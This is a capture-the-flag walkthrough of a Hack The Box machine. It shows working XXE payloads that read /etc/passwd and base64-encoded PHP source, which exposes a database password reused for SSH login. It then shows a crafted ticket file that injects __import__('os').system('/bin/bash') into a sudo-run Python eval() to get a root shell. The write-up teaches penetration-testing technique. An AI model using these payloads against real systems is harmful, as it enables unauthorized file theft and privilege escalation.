# Getting User
Well we've tried a few things that might cause issues but they aren't working so it's time to look under the hood a little more. Let's fire up BurpSuite and take a closer look at the requests and responses.

`portal.php` redirected us to `log_submit.php`, so let's take a look at the source code of this page:
```html
<html>
	<head>
		<script src="/resources/jquery.min.js"></script>
		<script src="/resources/bountylog.js"></script>
	</head>
	<center>
		<h1>Bounty Report System - Beta</h1>
		<input type="text" id = "exploitTitle" name="exploitTitle" placeholder="Exploit Title">
		<br>
		<input type="text" id = "cwe" name="cwe" placeholder="CWE">
		<br>
		<input type="text" id = "cvss" name="exploitCVSS" placeholder="CVSS Score">
		<br>
		<input type="text" id = "reward" name="bountyReward" placeholder="Bounty Reward ($)">
		<br>
		<input type="submit" onclick = "bountySubmit()" value="Submit" name="submit">
		<br>
		<p id = "return"></p>
	<center>
</html>
```

Two bits to notice on here:
1. When the submit button is is clicked the `bountySubmit()` function is called
2. There are two JavaScript scripts called on this page `jquer.min.js` (probably not that interesting to us unless it's vulnerable in some way) and `bountylog.js`

JavaScript files can nearly always be viewed in the browser so we can go take a look at `bountylog.js` and see what it does:
```js
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

Interesting, there's a few things here that catch my eye. The first thing without even trying to read the code is the `<?xml  version="1.0" encoding="ISO-8859-1"?>` section in the `bountySubmit()` function. As soon as you see this your brain should immediately spring to the possibility of XML Entity Injection attacks (also known as XXE attacks). These kind of web application attacks are surprisingly quite common and are in the OWASP top 10 of vulnerabilities. If you want to read more about them you can take a look at https://owasp.org/. With an XXE attack we can pull files from the server itself and display them in our browser. Not only does that mean we can view sensitive files such as the `/etc/passwd` file but also web server configuration files.

The other bits to spot here is that these functions together take the user input, insert it into the relevant fields, converts everything to base64 with the `btoa()` method and POST's that to `tracker_diRbPr00f314.php`. The tracker PHP file probably decodes the base64 blob of data and drops the user input back into the relevant HTML elements and returns that to the browser so we can see it as shown in the screenshot above.

So, if we can intercept the data submission to the `tracker_diRbPr00f314.php` file we might be able to inject an XML entity into it and get the results displayed back to us. First let's intercept the data submission in BurpSuite:
![[Pasted image 20210822180525.png]]
As expected the data has been encoded to Base64 but, also notice the last two characters have been URL encoded also. `%3D` is the URL encoding for the equals `=` character. This probably means that any other special characters will also be URL encoded within the Base64 string such as `+` and `/`. OK, let's send this to the Repeater functionality with Burp with the `ctrl+r` hotkeys and then switch to Repeater with the `shift+ctrl+r` hotkey shortcut. OK, now we have this ready in Repeater, lets go and get our XXE payload ready. The way I'm going to do this is copy the data blob in the POST request we just intercepted and paste it into the Decoder function in BurpSuite:
![[Pasted image 20210822181514.png]]
Now we have the data blob decoded, we can edit it. We can do that in BurpSuite here in the decoder directly but to keep a record of what we've done let's copy it and paste it into our notes or a separate file. Up to you how you keep track of what you're doing but here is the original data blob:
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>test</title>
		<cwe>Vosnet</cwe>
		<cvss>Vosman</cvss>
		<reward>100</reward>
		</bugreport>
```

Now let's amend it to incorporate our XXE payload:
```xml
<?xml  version="1.0"?>
<!DOCTYPE foo [
<!ENTITY vos SYSTEM "file:///etc/passwd">]>
		<bugreport>
			<title>test</title>
			<cwe>cwe</cwe>
			<cvss>cvss</cvss>
			<reward>&vos;</reward>
		</bugreport>
```
What we're doing here is introducing an XML entity (`vos`) and assigning the value of that entity as a SYSTEM request to read the contents of a file we expect to be on the system. As this is a Linux Ubuntu box we can be fairly certain the `/etc/passwd` file will be there so we request this. This will be processed by the server and the contents of the targeted file will be stored in the `vos` entity. That entity is then called in the \<reward\> element. If this works we should get the `/etc/passwd` file contents displayed in the response.

Right, now we're ready to test this. So, let's paste our newly created payload back into Burp's Decoder, encode it as Base64 and then URL encode it:
![[Pasted image 20210822183139.png]]
Note: Although the entire string is now URL encoded, it shouldn't matter as we know it will be decoded back to Base64 and then decoded again after that. In fact, having the entire string URL encoded is safer for us as any special characters will be encoded and we don't run the risk of missing one and everything failing.

Let's update the data parameter in the saved request we have in Repeater and click send to see if this works:
![[Pasted image 20210822183804.png]]
Awesome! The contents of the web server's `/etc/passwd` file has been returned in the Reward element in the response. One thing to note when seeing this file is that there is only one user (aside from Root) on the box, Development. We know this because all users on a Linux box will start with the UID of 1000 and it is also has a login shell assigned to it `/bin/bash` and a home directory. We should keep this in mind as that will probably be the user we need to compromise to gain access to this box.

So far so good. We know we can get files from the server however, we are most likely making these requests as the `www-data` user and so we won't be able to get files from inside the Development user home directory (well, we're unlikely to be able to do that anyway) and we also don't know file names on the server to try and get. As the `www-data` user we are definitely going to be able to pull files that are being presented on web-server. The most interesting files are going to be the `.php` files. 

PHP stands for Hypertext Preprocessor, I don't know why it's called PHP but there you go. We can't see the PHP code that is contained within the PHP files as the code is processed by the server before being sent in a web response; hence the name. The reason these files are interesting is that the PHP code may have some sensitive information included but if we request a PHP file in the same way we requested the `/etc/passwd` file we probably won't get to see the PHP portion of the file. So, to try and get around this we can request the file and base64 encode it to prevent the processing of the PHP code within the files. The way we do this is with the `php://filter/convert.base64-encode/resource=` filter command.

Due to the simplicity of this web application and the fact the JavaScript code we examined earlier doesn't specify an absolute path to the `tracker_diRbPr00f314.php` file, we can assume the our XXE payload is being processed within the web root directory so we won't need to try and find the absolute path to the `.php` files we want to examine. If this wasn't the case we might be able to find out what the absolute path to the web root is from the `/etc/apache2/site-available/000-default.conf` file if it exists.

> Now casting our minds back to the GoBuster enumeration we did, there was a file called `db.php`. This appeared to be an empty file because any PHP code that the file contains won't be returned in a web response, but, maybe it isn't as empty as it first appears...

Ok, let's adjust our XML payload to encode the PHP file and see if our target file really is empty:
```xml
<?xml  version="1.0"?>
<!DOCTYPE foo [
<!ENTITY vos SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>
		<bugreport>
			<title>test</title>
			<cwe>cwe</cwe>
			<cvss>cvss</cvss>
			<reward>&vos;</reward>
		</bugreport>
```

Now if you're using the latest versions of BurpSuite Pro you can adjust the payload in the Inspector pane and then apply the changes and resend the request. I'm not sure if this works in the Community Edition:
![[Pasted image 20210823190056.png]]
Once the data blob is highlighted change the text to be our new payload as shown and click 'Apply Changes':
![[Pasted image 20210823190418.png]]
Click send and we'll get a Base64 encoded blob in the web response. If we now highlight that, BurpSuite will decode it and show us the code as shown below:
![[Pasted image 20210823190831.png]]

Excellent! We have some credentials in the`db.php` file that originally appeared to be empty. let's make a note of them:
```text
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Note: If you don't have the latest versions of BurpSuite or the Inspector function is unavailable you'll need to encode the payload using Burp's Decoder to encode the payload as before and then manually decode the response again in Decoder to see the PHP code.

OK, we know there is no database exposed to us so we can't access this. We also know from the `/etc/passwd` file we managed to grab that there is no user on the box called "admin" however, if the creator of this database is reusing passwords then maybe we can use this password to login as the Development user via SSH. Let's give it a go:
![[Pasted image 20210823192216.png]]

Sweet! it worked, and now we have access to `user.txt`.

----

# Getting Root
One of the first commands I like to run when I get onto a Linux box is `sudo -l` to list any commands that we can run with `sudo`:
![[Pasted image 20210823194807.png]]

Interesting... we can run a Python script as root. Let's go check out what this script does `nano /opt/skytrain_inc/ticketValidator.py`, here is the code:
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

So, a quick look through this script we can see the following:
1. This is a script to check a file (a ticket in this scenario) and it's contents
2. The file needs to have the extension `.md` (Markdown)
3. The first line of the `.md` file must start with "# Skytrain Inc"
4. The second line of the file must start with "## Ticket to "
5. The third line needs to be "\_\_Ticket Code:\_\_"
6. The fourth line needs to start with "**"

Looking a little deeper the interesting part of this file is the `eval(x.replace("**", ""))` because `eval()` can be very dangerous if what ends up in between the brackets can be manipulated by an attacker (us in this case :D). `eval()` will not only perform mathematical computations (which is what it is being used for here) it will also execute code. All we need to do is ensure the script gets to the `eval()` statement by passing all of the checks along the way and we can execute a code to spawn a shell and as this script will be run as root we should get a shell as root.

OK, so how do we do that? Well apart from the six items listed above, the following portion of the code needs to be worked on:
```python
if code_line and i == code_line:
	if not x.startswith("**"):
		return False
	ticketCode = x.replace("**", "").split("+")[0]
		if int(ticketCode) % 7 == 4:
			validationNumber = eval(x.replace("**", ""))
            if validationNumber > 100:
            	return True
            else:
            	return False
```

Let's break this down:
1. `ticketCode = x.replace("**", "").split("+")[0]`
	1. The value of the variable `ticketCode` will be line four of the file which has to start with \*\*. These will be replaced with nothing, then the remaining string will be split into an array using the \+ character as a delimiter, then select the first value of the array \[0\]. So if line four of the file was \*\*1+2+3+4 the script would first remove the \*'s leaving 1+2+3+4, then break that up into an array split by the + characters \[1,2,3,4\]. Python always starts counting from 0, so the \[0\] will select the first value in the array which in this example is 1.
2. `if int(ticketCode) % 7 == 4:`
	1. Next the script converts the value of `ticketCode` into an integer
	2. `%` in Python performs the modulus mathematical function. This means it returns the remainder value of a division between two numbers. In this case it is the division of the value of `ticketCode` divided by 7. If the remainder of this sum equals 4 the script will move onto the next line, if not the check fails. In our example we have the value of 1 in the `ticketCode` variable: 1 divided by 7 does not go and so 1 modulus 7 would be 1; not equaling 4 and then in this case, fails the check.
	3. There are two easy ways we can pass this check: 1. we ensure the first number is in the string is 4, as this will be 4 modulus 7 = 4, or 2. ensure the first number is 11 as 11 divided by 7 goes once leaving a remainder of 4.
3.  `validationNumber = eval(x.replace("**", ""))`
	1.  This is the vulnerable portion of the code and now we are here after passing all of the checks we need to include some code to spawn a shell.
	2.  To do that we can simply append `__import__('os').system('/bin/bash')` to the end of the fourth line. This should be evaluated by the script and call `os.system()` to spawn a bash shell as the root user.

So, that all understood let's create our own ticket file. First let's move to RAM to keep from writing exploit files to disk, this is just good practice for when you're on a client engagement, it's not strictly necessary with a HTB machine but it keeps it in muscle memory so to speak. `cd /dev/shm` 
`nano gimmeShells.md`
```md
# Skytrain Inc
## Ticket to VosTown
__Ticket Code:__
**4+1+__import__('os').system('/bin/bash')
```

Run the ticketValidator script `sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` and pass it our exploit file:
![[Pasted image 20210824180209.png]]
We are now root and can read the `root.txt` file.

Job Done! 